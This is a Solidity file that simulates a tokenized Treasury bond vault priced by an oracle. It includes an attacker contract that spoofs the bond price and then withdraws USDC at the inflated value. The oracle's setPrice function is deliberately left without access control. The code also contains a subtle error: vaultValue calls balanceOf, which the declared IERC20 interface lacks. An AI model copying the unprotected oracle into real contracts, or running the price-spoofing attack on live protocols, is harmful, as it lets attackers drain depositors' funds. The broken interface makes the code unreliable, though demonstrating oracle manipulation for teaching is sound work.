// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title TBondModule - Simulated T-Bond Vault with Tokenized Ownership and Oracle Valuation

interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/// 📉 TBond Oracle (Price Per Bond)
contract TBondOracle {
    uint256 public bondPrice = 1000e6; // 1 bond = $1000 USDC

    function setPrice(uint256 _price) external {
        bondPrice = _price;
    }

    function getPrice() external view returns (uint256) {
        return bondPrice;
    }
}

/// 🪙 TBond Token (Claim on Real T-Bonds)
contract TBondToken {
    string public name = "Tokenized Treasury Bond";
    string public symbol = "TBOND";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public vault;
    mapping(address => uint256) public balances;

    constructor(address _vault) {
        vault = _vault;
    }

    modifier onlyVault() {
        require(msg.sender == vault, "Not vault");
        _;
    }

    function mint(address to, uint256 amt) external onlyVault {
        balances[to] += amt;
        totalSupply += amt;
    }

    function burn(address from, uint256 amt) external onlyVault {
        require(balances[from] >= amt, "Too much");
        balances[from] -= amt;
        totalSupply -= amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balances[msg.sender] >= amt, "Low balance");
        balances[msg.sender] -= amt;
        balances[to] += amt;
        return true;
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }
}

/// 💰 TBond Vault (Simulates Bond Purchase + Tokenization)
contract TBondVault {
    IERC20 public usdc;
    TBondToken public tbond;
    TBondOracle public oracle;
    address public admin;

    constructor(address _usdc, address _oracle) {
        usdc = IERC20(_usdc);
        oracle = TBondOracle(_oracle);
        tbond = new TBondToken(address(this));
        admin = msg.sender;
    }

    function deposit(uint256 usdcAmount) external {
        require(usdc.transferFrom(msg.sender, address(this), usdcAmount), "Transfer failed");
        uint256 bondPrice = oracle.getPrice();
        uint256 bondsIssued = usdcAmount * 1e18 / bondPrice;
        tbond.mint(msg.sender, bondsIssued);
    }

    function withdraw(uint256 bonds) external {
        uint256 bondPrice = oracle.getPrice();
        uint256 usdcToReturn = bonds * bondPrice / 1e18;
        tbond.burn(msg.sender, bonds);
        require(usdc.transfer(msg.sender, usdcToReturn), "Transfer failed");
    }

    function vaultValue() external view returns (uint256) {
        return usdc.balanceOf(address(this));
    }
}

/// 🔓 TBond Attacker (Spoof Bond Value)
interface ITBondVault {
    function withdraw(uint256) external;
}

contract TBondAttacker {
    function spoofPrice(TBondOracle oracle, uint256 spoofedPrice) external {
        oracle.setPrice(spoofedPrice); // Falsify bond valuation
    }

    function exploitWithdraw(ITBondVault vault, uint256 bonds) external {
        vault.withdraw(bonds); // Exit with inflated USDC value
    }
}
